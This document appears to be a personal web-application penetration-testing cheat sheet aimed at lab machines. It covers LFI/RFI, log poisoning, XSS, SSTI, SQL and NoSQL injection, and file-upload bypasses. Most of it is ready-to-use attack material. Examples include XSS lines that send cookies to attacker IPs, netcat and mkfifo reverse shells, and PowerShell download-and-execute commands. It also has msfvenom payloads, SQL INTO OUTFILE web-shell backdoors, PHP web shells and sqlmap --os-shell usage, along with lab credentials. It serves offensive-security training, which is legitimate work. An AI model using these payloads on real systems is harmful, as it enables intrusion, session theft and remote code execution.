# Web Attacks!
### General Process:  

	  Always try to Find the Application Version!!
	  Tools:
	    burpsuite (set up w/ foxyproxy extension)
	    cookie editor extension
	  Things to Check:
		Source code
			comments, urls, hard-coded credentials, functions, etc.
		Browser Dev Tools->Network Headers->Response Headers->server versions, etc.
		Cookies
		Requests & responses in burpsuite -> try to break things & produce errors
		Input boxes:
			code injection ( ; id)
			sql injection (' or ")
			xss (<script>alert(‘XSS’)</script>)
		URLs: look for strange parameters, file extensions, etc.
		Anywhere to edit content? - php themes, etc.
		Anywhere to upload files? - profile picture, plugins, etc.  

### Admin Consoles:  

	Look up default credentials
	See password attacks page
		brute force, try scraping from website
		Creating brute-force password lists: Crunch, Cewl (website-crawler)
		Scraping emails from website:  cewl -n -e --email_file mailid.txt http://sneakycorp.htb
	PHP login bypass in burpsuite:  username=admin&password[]=

### URL Techniques:  

    LFI:  php 'include' statement means code is executed            
        ex. ?page=/../../../../../etc/passwd OR ?file=c:\windows\system32\drivers\etc\hosts 
        See LFI Interesting Files
		Windows:  https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/
        Tip: put %00 at end:  ex. http://target.com/?page=./../../../../../../../../../etc/passwd%00
        LFI Cheat Sheat/reverse shell methods:  https://highon.coffee/blog/lfi-cheat-sheet/  
        PHP Wrapper Method:
		Cheat sheet:  https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers-and-protocols
        	ex. http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
    LFI TO RCE:
        Log poisoning
            See what logs you can include, then figure out how to get that service to log your request
            ex. log into ftp server with user of '<? php system($_GET['cmd']); ?>' , then lfi the var/log/vsftpd.log
            /var/log/apache2/access.log:   `nc 1.1.1.1 80, then GET /<?php system($_GET['cmd']);?>`
            /proc/self/environ: use burp (https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) to send malicious url with a modified user-agent
            Windows: `?file=c:\xampp\apache\logs\access.log&cmd=ipconfig   nc -nv 1.1.1.1 80 ,   <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
            Email method:  https://bitvijays.github.io/LFC-VulnerableMachines.html
            LFI log contamination tactic: connect w/:  nc -nv 10.11.0.22 80, then send:  <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
            	then:  http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    RFI:
    	ex. make and host a local evil.txt file:  <?php echo shell_exec($_GET['cmd']); ?>
                http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
        Try shell saved as .txt, .php, etc. - see what type of scripts the site uses
        works if allow_url_fopen and allow_url_include both = On in the file /etc/php5/cgi/php.ini -- php.ini location is seen in phpinfo.php file
        ex. Using reverse.txt php shell:  `?page=http://1.2.3.4/reverse.txt?  OR:  ?page=http://1.2.3.4/reverse.txt%00`
	
	PHP Execution:
		?code=phpinfo()
		?code=system('id'); (if single line output)
		?code=echo shell_exec('/sbin/ifconfig eth0'); (if multiple line output)
  
### XSS:  

	If you can execute reflected or stored .js code
	3 types: persistent/stored, reflected, DOM based
        	Stored: look for comments, reviews, user profile, guestbook, contact form, etc.
        	Reflected: search box, etc.
	Checks:
		Cheat Sheet:  https://www.jb51.net/tools/xss.htm
        	Look for unsanitized input that is displayed as output; characters to try:  < > ' " { } ;  -> Check Source Code; see how they're stored
		Try javascript code in all input boxes, username/password (if displays incorrect username), search (if results display the searched keywords) -- or URLs
        	Basic payload:  <script>alert(‘XSS’)</script>
	Techniques & Payloads:
		Test:  <script>alert("XSS")</script>
		Script:  <img src="10.10.14.18/test.jpg" /> <script src="http://10.10.14.18/test.js"></script>
		Steal Cookie (if Secure and HTTPOnly flags not set):
			Example 1:  <script>new Image().src="http://10.10.28.40:8000/cool.jpg?output="+document.cookie;</script> ; sudo nc -nvlp 80
			Example 2:  <script>document.location="http://10.10.14.18 username="+document.cookie;</script>
			Example 3:
				function pwn() {
				    var img = document.createElement("img");
				    img.src = "http://10.10.14.18/xss?=" + document.cookie;
				    document.body.appendChild(img);
				}
				pwn();
				<script src="http://10.10.14.18/xss.js"></script>
				python -m SimpleHTTPServer 80
		Reverse Shell:  <img src=http://10.10.15.25/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.15.25'$IFS'4444')>
		Windows Reverse Shell (if the website can run the dir command):
			Method 1:  <script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.18:80/mini-reverse.ps1')");</script>
			Better Method:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe -o payload.exe
				<script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.18:80/payload.exe','C:/temp/payload.exe')");</script>	
		Session Hijack (upload BEEF hook): <script src="http://1.2.3.4:3000/hook.js"></script>  (copy from beef program)
		
### XSRF:  

	If you can get a user to click a link
	See if you have a password reset form, etc. that can be submitted via url -- make the admin account click it and change to your desired password
		ex. http://10.10.10.97/change_pass.php?password=password&confirm_password=password&submit=submit ; Confirm: nc -nvlp 80; http://<yourIP>/complete

### Server-Side Template Injection:  

	If you can inject content into a page's source code (ex. manipulating a POST request parameter field)
	Detect:  ${{<%[%'"}}%\.
	Methodology:  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology
		https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
		Example:  https://shubham-singh.medium.com/doctor-htb-walkthrough-70bcb9eedefd 
		Step 1: Follow diagram to determine template engine
	Wordlist of GET/POST parameters:  https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt
	*Automated Tool:  https://github.com/epinna/tplmap
		Python fix:  https://fahmifj.github.io/blog/tplmap-install/
	{{config}}; {{.}}; 
	Golang: {{ .DebugCmd "id" }}

### SQL Injection:  

	If a database is queried without proper input sanitization
	Checks:
		Input fields:  see if ' or " cause errors
        	URL parameters:  might need to URL encode
			?id=1' produces error?
			?cod=1+and+2=2  displays correctly?
		Crawl:  sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
	Authentication bypass:
		username:  admin'# ; password:   abc' OR 1=1#
		' or '1'='1
        	tom' or 1=1;#
		admin' or 1=1-- -
		abc' OR 1=1--
		Others:  https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ or https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
        	Fix "multiple row" error:   tom' or 1=1 LIMIT 1;#
	Example SQL Queries & Syntax:
		select * from accounts where username='$user' and password='$pass'
		Comment symbol: # (MySQL) or -- (standard SQL)	
	Manual Exploitation:  figure out structure, then extract data
		URL Parameter:
			1. Determine number of columns:
			    ?id=1 order by 1;    -> increment until error
			2. See which columns #'s are being displayed:
			    ex. if 4 columns:   ?id=1 union all select 1, 2, 3
			3. Extract data:
				?id=1 union all select 1, 2, @@version  (or version())
				union all select 1, 2, user()
				union all select 1, 2, database()
				UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
				union all select 1, 2, table_name from information_schema.tables
				    union all select 1, 2, column_name from information_schema.columns where table_name='users'
				    union all select 1, username, password from users
					or:  union select 1,2,concat(name,0x3a,password) FROM users
				Read File:  union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
					UNION SELECT 1, load_file(/etc/passwd) #
					union select null,load_file('/etc/passwd'),null,null,null
				Make Backdoor:  
					Win:  union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/cmd.php'
						Or:  union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#
					Unix:  union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
						Or:  ?cod=1+union+select+1,2,3,4,5,6,'<?php_system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
			    		Access:  10.11.0.22/backdoor.php?cmd=ifconfig
					Windows: try creating admin user and add to RDP group
	Automated Exploitation:
		Post:
			Capture request w/ burp & save, then:  sqlmap -r request.txt -p username
		Get:
		    sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
			Dump database:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump [-D Webapp -T Users]
			Open Shell:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
		Examples:
			Automated Scan:  sqlmap -u http://example.com --forms --batch --crawl=10 --cookie=sessionid=12345 --level=5 --risk=3
			Targeted Scan:  sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/page.php" 
			Check Form for Injection:  sqlmap -o -u "http://example.com/form/" --forms
			sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql --technique=U --random-agent --dump
			sqlmap -o -u "http://example.com/vuln-form" --forms -D database-name -T users --dump
	Blind SQL Injection:
		URL:  ?id=1-sleep(4)
	SQL command LFI/reverse shell:  add field in table with value:  <?php system($_REQUEST["cmd"]);?>

### NOSQL Injection:  

	in burp, try: username[$ne]=..., password[$ne]=...
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
	If injection succeeds, enumerate accounts with: https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
	python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep username
		then: python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep password

### PHP Content Injection:  

	Anywhere to edit and then execute/access a .php file? - Wordpress/Joomla theme file, etc.
		See reverse shells page - pick language based on web page format
			*PHP Advanced Content Inject Reverse Shell
	Troubleshooting:  try URL encoding of characters; if shell is blocked, try common port like 80 or 443
	ex. <?php echo shell_exec($_GET['cmd']); ?>
		http://127.0.0.1/webshell.php?cmd=id
		http://127.0.0.1/wordpress/?cmd=nc [IP attack box] [port] -e /bin/sh
	ex. <?php system($_GET["cmd"]); ?>
	ex. <? passthru($_GET["cmd"]); ?>	
	ex. PHP Non-Interactive Web Shell:
		<?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>
		Access: <filename>.php?fupload=nc.exe (for example) and <filename>.php?fexec=nc IP PORT
	
### File Upload / Web Shells:  

	General Upload Test:  `davtest -url http://10.10.10.15`
	Look for alternate upload locations: SMB, FTP, etc.
		Example:
			smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put cmd.php cmd.php'
			curl -s -X GET http://secnotes.htb:8808/cmd.php?cmd=whoami
			smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put nc.exe nc.exe'
			curl -s -X GET http://secnotes.htb:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+443
	PHP Web Shell:  ex. https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php	
	Filter Bypass:
		https://book.hacktricks.xyz/pentesting-web/file-upload
		- Rename:
			Try upload as shell.php.jpg or shell.php%00.jpg or shell.jpg.php
			.php, .pht, .phtml, .php3, .php4, .php5, .inc
			.asp, .aspx
			.pl, .pm, .cgi, .lib
			.jsp, .jspx, .jsw, .jsv, .jspf
			.cfm, .cfml, .cfc, .dbm
		- Rename after uploading (ex. upload as .html, then move to .aspx):
			    - Upload file with curl:  `curl http://10.10.10.15/ --upload-file shell.txt`
				- or:   `curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php`
			- Move/Rename file:  `curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt`
				- ex.  `curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt`
		-Bypass MIME type validation:
			Burpsuite: modify POST request Content-Type header
			Edit magic bytes:  echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
				Or:  add before shellcode: `GIF89a;`
		-Image Hidden PHP Code (bypasses getimagesize() validation):
			w/ Gimp--put code in properties/comments 
			exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
	ex. PHP code in image:
		cp original.png ./shell.php.png
		echo '<?php' >> ./shell.php.png
		echo 'passthru("whoami");' >> ./shell.php.png
		#echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f");' >> ./shell.php.png
			Or: echo 'system($_REQUEST["cmd"]);' >> ./shell2.php.png
		echo '?>' >> ./shell.php.png
		visit example.com/uploads/shell.php.png or example.com/uploads/shell.php.png?cmd=id

### Specific Applications/Vulnerabilities:  

	PHPMyAdmin:
		in sql console:  select * from webappdb.users;
		make a user:  insert into webappdb.users(password, username) VALUES (”backdoor“,”backdoor“);
	Tomcat Web Application Manger War Shell Upload:
		msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=4444 -f war -o pwn.war
		***: curl -T "pwn.war" -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/miao&update=true"
		Or automate with:  https://github.com/mgeeky/tomcatWarDeployer
		python autowar.py http://10.10.10.95:8080 -U tomcat -P s3cret -H <attacking machine IP> -P 4321
	CGI-BIN Directory: look for .sh scripts (Shellshock vulnerability):
		dirb http://10.10.10.56/cgi-bin -X .sh
